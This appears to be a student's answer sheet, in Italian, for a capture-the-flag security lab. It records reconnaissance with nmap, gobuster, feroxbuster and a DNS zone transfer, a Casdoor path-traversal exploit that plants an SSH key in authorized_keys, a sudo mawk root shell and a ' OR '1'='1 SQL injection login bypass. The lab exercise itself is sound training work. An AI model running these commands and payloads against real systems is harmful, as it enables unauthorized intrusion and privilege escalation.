Nome e cognome: Luca Gugliotta
Matricola: 0342634
###### Domanda 1
Quante porte sono aperte sulla macchina target (top1000)?

**Formato Risposta:** `numero`

IP TARGET `192.168.14.16`
risposta: 2 
con comando
``nmap --top-ports 1000 192.168.14.16``
###### Domanda 2
Qual è il nome di dominio principale della biblioteca?

**Formato Risposta:** `nomedominio.top`

 **Target IP:** `192.168.14.16` LIVE

risposta:`orbetellobiblio.vdsi`
letto come dominio di email sui contatti

modifico etc hosts
###### Domanda 3
Qual è l'URL completo della piattaforma dedicata ai dipendenti e alla gestione interna?

**Formato Risposta:** `http://URL_COMPLETO/con/path/se/presente`
trovato mettendo append domain a gobuster


`gobuster vhost --ad -u http://orbetellobiblio.vdsi -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt`

`risposta: management.orbetellobiblio.vdsi`

###### Domanda 4
A quale percorso web è installato il software per la gestione delle identità?

**Formato Risposta:** `http://URL_COMPLETO/con/path/se/presente`

`feroxbuster -u http://management.orbetellobiblio.vdsi -w /usr/share/seclists/Discovery/Web-Content/common.txt                `





                                                                                                                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://management.orbetellobiblio.vdsi/
 🚩  In-Scope Url          │ management.orbetellobiblio.vdsi
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       63l      152w     2137c http://management.orbetellobiblio.vdsi/notes.html
200      GET      262l      486w     4771c http://management.orbetellobiblio.vdsi/style.css
200      GET      115l      229w     4752c http://management.orbetellobiblio.vdsi/hr.html
200      GET       79l      232w     3379c http://management.orbetellobiblio.vdsi/it-settings.html
200      GET       86l      239w     3895c http://management.orbetellobiblio.vdsi/directory.html
200      GET       86l      182w     3565c http://management.orbetellobiblio.vdsi/documents.html
200      GET       68l      181w     2540c http://management.orbetellobiblio.vdsi/index.html
200      GET       68l      181w     2540c http://management.orbetellobiblio.vdsi/
200      GET        1l       54w      702c http://management.orbetellobiblio.vdsi/identity
[####################] - 3s      4758/4758    0s      found:9       errors:0      
[####################] - 3s      4751/4751    1863/s  http://management.orbetellobiblio.vdsi/ 


e  stato trovato http://management.orbetellobiblio.vdsi/identity
che suggerisce di andare su http://casdoor.admin.orbetellobiblio.vdsi/login

###### Domanda 5
`Casdor`
###### Domanda 6

**3.54.0** notata su 
`http://management.orbetellobiblio.vdsi/notes.html`
###### Domanda 7
e  stata trovata la vulnerabilità dopo aver scoperto la verisone su 
https://www.exploit-db.com/exploits/52584
risposta:
`CVE-2026-6815`
###### Domanda 8
la vulnerabilità è Arbitrary File Write
`python script.py --url http://casdoor.admin.orbetellobiblio.vdsi/login --rpath /home/casdoor`

/home/kali/.ssh/id_ed25519.pub

```python
└─$ python3 CVE-2026-6815.py --url http://casdoor.admin.orbetellobiblio.vdsi  --usr admin --psw 123 --file /home/kali/.ssh/id_ed25519.pub --rpath /home/casdoor/.ssh/authorized_keys 
[*] Step 1: Retrieving initial session cookie...
[+] Session ID obtained: f42030e203875c662914dc1fdfd61ac3
[*] Step 2: Logging in as admin...
[+] Login successful. Admin privileges confirmed.
[*] Step 2.5: Checking Casdoor version...
[+] Target Casdoor version: v3.54.0
[*] Step 3: Creating Path Traversal Provider...
[+] Malicious provider created successfully.
[*] Step 4: Uploading /home/kali/.ssh/id_ed25519.pub to /home/casdoor/.ssh/authorized_keys...

```

$ ssh -i /home/kali/.ssh/id_ed25519 casdoor@192.168.14.16
ssh -i /home/kali/.ssh/id_ed25519 casdoor@192.168.14.16
`/home/casdoor/.ssh/authorized_keys`


###### Domanda 10
Quali credenziali risultano configurate sull'applicazione di Identity Access Management?


admin:123

###### Domanda 11
`VDSI{c4sd00r_1n1t14l_4cc3ss_g41n3d}`

###### Domanda 12
L'obiettivo è ottenere l'accesso come utente `developer`. Qual è il contenuto della seconda flag (user.txt)?

**Formato Risposta:** `VDSI{...}`

nome=alla password
developer
###### Domanda 13
Qual è il contenuto della flag finale (root.txt)?

Formato Risposta: VDSI{...}

sudo -l

mawk '//' /path/to/input-file

sudo ./usr/bin/mawk 'BEGIN {system("/bin/bash")}'
`VDSI{m4wk_sUD0_r00t_c0mpr0m1s3}`

#### PARTE 2
###### STNDA01
Durante il monitoraggio dell'infrastruttura di rete aziendale `vdsi-corp.xyz` **porta 58090**, i sistemi di sicurezza hanno rilevato attività anomale riconducibili a una possibile compromissione. Si sospetta che un server sia stato infettato e stia tentando di esfiltrare dati riservati verso l'esterno. Il tuo primo obiettivo come analista SOC è mappare l'infrastruttura DNS esposta alla **porta 58053** e individuare eventuali portali di servizio non documentati. Effettua una ricognizione DNS sull'infrastruttura per scoprire il sotto-dominio associato al portale interno di diagnostica. Una volta individuato il portale, accedi alla sua dashboard sulla per recuperare il primo indicatore di compromissione. Qual è la flag esposta sull'interfaccia?

**Formato Risposta:** `VDSI{...}`

└─$ dig @192.168.14.16 vdsi-corp.xyz -p 58053 axfr

; <<>> DiG 9.20.15-2-Debian <<>> @192.168.14.16 vdsi-corp.xyz -p 58053 axfr
; (1 server found)
;; global options: +cmd
vdsi-corp.xyz.          3600    IN      SOA     ns1.vdsi-corp.xyz. www.vdsi-corp.xyz. 2026060801 7200 3600 1209600 3600
vdsi-corp.xyz.          3600    IN      NS      ns1.vdsi-corp.xyz.
n3tt00ls.vdsi-corp.xyz. 3600    IN      A       127.0.0.1
ns1.vdsi-corp.xyz.      3600    IN      A       127.0.0.1
vdsi-corp.xyz.          3600    IN      SOA     ns1.vdsi-corp.xyz. www.vdsi-corp.xyz. 2026060801 7200 3600 1209600 3600
;; Query time: 12 msec
;; SERVER: 192.168.14.16#58053(192.168.14.16) (TCP)
;; WHEN: Fri Jun 12 10:45:23 EDT 2026
;; XFR size: 5 records (messages 1, bytes 335)

http://n3tt00ls.vdsi-corp.xyz:58090/
`VDSI{diagnostic_portal_discovered}`

###### Domanda 2
https://onlinewebdevtools.com/hex-to-file
VDSI{dns_exf1ltr4t10n_d3c0d3d_2026}

#### PARTE 3
http://192.168.14.16:58088/

ispezionando si può trovare il path
`d03f8e7a83d4c6d3bc8b3d688cf0e78a/login.php`
poi facendo su username e password è possibile accedere
```
' OR '1'='1
' OR '1'='1
```

VDSI{sqli_breakout_debug_success}
